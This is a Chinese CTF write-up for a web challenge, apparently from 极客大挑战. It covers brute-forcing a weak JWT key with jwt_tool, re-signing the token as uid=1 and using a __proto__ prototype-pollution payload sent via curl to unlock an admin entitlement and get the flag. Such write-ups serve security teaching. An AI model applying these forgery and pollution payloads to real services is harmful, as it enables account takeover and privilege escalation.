---
date: 2026-11-23 13:30:00
slug: geek2019-garlic-vault
categories:
  - Web
  - JWT
  - 原型链污染
---

# [极客大挑战] 大蒜哥 — JWT 换成 uid=1，再往原型上塞一个 entitlement

> **题目类型**：JWT 伪造（弱密钥）+ 原型链污染
>
> **Flag**：`SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}`

---

## 题目概述

注册登录后是个“游戏库”页面。**表面上是点卡片启动游戏，实际上真相全在 `app.js` 里。**

---

## 解题过程

### Step 1：先看 token 存在哪

```javascript
const TOKEN_KEY = "garlic_vault_token";

function token() {
  return localStorage.getItem(TOKEN_KEY) || "";
}
```

**JWT 存在 `localStorage`，键名是 `garlic_vault_token`。**

**控制台里直接看：**

```javascript
console.log(localStorage.getItem("garlic_vault_token"))
```

**拿到 token 之后，再看它是怎么发出去的：**

```javascript
async function api(url, options = {}) {
  const headers = { ...(options.headers || {}) };
  if (token()) headers.Authorization = `Bearer ${token()}`;
  const response = await fetch(url, { ...options, headers });
  const data = await response.json().catch(() => ({}));
  if (!response.ok) throw new Error(data.message || "服务器暂时没有响应");
  return data;
}
```

**所有请求都自动带上 `Authorization: Bearer <token>`。**

**所以只要能改 token 内容，就能以任意身份调用接口。**

### Step 2：代码里直接告诉你该改什么

```javascript
async function loadVault() {
  try {
    const state = await api("/api/vault");
    if (state.mode === "owner") {
      await api("/api/admin/games");
      return loadOwnerPanel(state.username, state.consoleScript);
    }
    return renderVisitor(state.username);
  } catch (_) {
    return renderLogin();
  }
}

// OWNER PROFILE // GARLIC #001
```

**两个关键信息：**

```
state.mode === "owner"  → 才会调 /api/admin/games
// OWNER PROFILE // GARLIC #001   → 管理员是 #001，也就是 uid = 1
```

**所以目标是：把 JWT 里的 `uid` 改成 1。**

### Step 3：解 token，确认字段

```powershell
cd E:\dsh\tools\jwt_tool
python jwt_tool.py "<你的token>"
```

**解出来：**

```
username = "12"
uid      = 2333
iat      = 1795410143
exp      = 1795417343
iss      = "garlic-private-server"
```

**`uid: 2333` 是普通用户，要改成 `1`。**

### Step 4：爆破签名密钥

```powershell
python jwt_tool.py "<你的token>" -C -d "C:\Users\崔路宽\Desktop\dict.txt"
```

**爆破结果：`123123`**

**（这类题密钥几乎一定是纯数字或常见词，小字典跑几十秒就出。）**

### Step 5：用密钥重签 uid=1

```powershell
python jwt_tool.py "<你的token>" -I -pc uid -pv 1 -S hs256 -p 123123
```

**得到的 payload 形如：**

```json
{"username":"12","uid":1,"iat":1795410143,"exp":1795417343,"iss":"garlic-private-server"}
```

**把新 token 写回 localStorage，然后刷新页面：**

```javascript
localStorage.setItem("garlic_vault_token", "<新token>")
location.reload()
```

**刷新后 `state.mode` 变成 `owner`，自动进入管理员面板。**

### Step 6：面板里的按钮全是装饰

**进去之后点卡片没反应。**打开网络面板看，**按钮只改了页面上的一行字，根本没发请求。**

**真正有用的只有一段代码：**

```javascript
const gta6Endpoint = "/api/admin/gta6/launch";
const gta6Entitlement = "gta6_play";

async function bootGta6(app, api) {
  const result = await api(gta6Endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ game: "gta6", settings: { quality: "ultra" } })
  });
  output.textContent = result.flag || "GTA6 已启动。";
}
```

**注意这两个常量：**

```
端点          POST /api/admin/gta6/launch
权限标识      gta6_play   ← 后端就是看这个
```

**正常情况下用户没有 `gta6_play` 这个权限，所以拿不到 flag。**

### Step 7：用原型链污染伪造权限

**把请求体里的 `settings` 换掉，让 `gta6_play` 出现在**原型链**上：**

```json
{
  "game": "gta6",
  "settings": { "__proto__": { "gta6_play": true } }
}
```

**为什么这样能过：**

```
后端大概率做了把 settings 合并进某个对象（Object.assign / 展开）的动作
合并时 __proto__ 会把 gta6_play 挂到 Object.prototype 上
之后任何对象查 gta6_play 都会命中 → 权限判断通过
```

**这就是原型链污染：**你没有那个字段，但你的**原型**有。**

**拿 flag 的请求：**

```powershell
curl.exe -s -X POST "http://目标/api/admin/gta6/launch" `
  -H "Content-Type: application/json" `
  -H "Authorization: Bearer <uid=1的token>" `
  -d '{\"game\":\"gta6\",\"settings\":{\"__proto__\":{\"gta6_play\":true}}}'
```

**返回里的 `flag` 字段就是答案：**

```json
{"unlocked":true,"title":"一男一女 / GTA6","flag":"SYC{I_ReAlLy_WaNt_To_PlaY_GTA_6}"}
```

**`unlocked: true` 这一项就是被污染出来的权限——原本用户并没有 `gta6_play`。**

---

| 环节 | 关键点 |
| --- | --- |
| token 位置 | `localStorage["garlic_vault_token"]` |
| 发送方式 | 每个请求自动加 `Authorization: Bearer` |
| 身份判断 | `state.mode === "owner"` 才进管理面板 |
| 改名线索 | 注释 `// OWNER PROFILE // GARLIC #001` → uid=1 |
| 密钥 | 爆破得 `123123` |
| 重签 | 只改 `uid`，其他字段原样保留 |
| 按钮无效 | 纯前端装饰，真正接口是 `/api/admin/gta6/launch` |
| 权限标识 | `gta6_play`（前端常量名 `gta6Entitlement`） |
| 污染点 | `settings` 里的 `__proto__` |

---

??? note "完整流程"

    ```powershell
    # ① 看 token
    # 浏览器控制台：localStorage.getItem("garlic_vault_token")

    # ② 解析 + 爆破
    python jwt_tool.py "<token>" -C -d dict.txt        # → 123123

    # ③ 重签 uid=1
    python jwt_tool.py "<token>" -I -pc uid -pv 1 -S hs256 -p 123123

    # ④ 写回并刷新
    # localStorage.setItem("garlic_vault_token","<新token>"); location.reload()

    # ⑤ 原型链污染拿 flag
    curl.exe -s -X POST "http://目标/api/admin/gta6/launch" `
      -H "Content-Type: application/json" `
      -H "Authorization: Bearer <新token>" `
      -d '{"game":"gta6","settings":{"__proto__":{"gta6_play":true}}}'
    ```

??? note "这题踩的坑"

    **① 进了面板就到处点**

    **卡片是纯前端装饰**，点了只改页面文字。**真正的价值在“网络”面板里那条 `console-script` / `gta6/launch` 请求。**

    **② 以为改了 uid 就能直接拿 flag**

    **uid=1 只给你“进门”的资格**，`gta6_play` 这个权限还得自己造——**这才是这题的第二个考点。**

    **③ 重签时把 iat/exp 写死成旧值**

    **token 有有效期**，改签时最好把 `iat`/`exp` 更新到当前时间，否则改完还是过期。

    **④ `__proto__` 拼错**

    是**两个下划线**：`__proto__`。写成 `__potor__` 之类的，服务端只会把它当成一个普通字段，什么都不会发生。
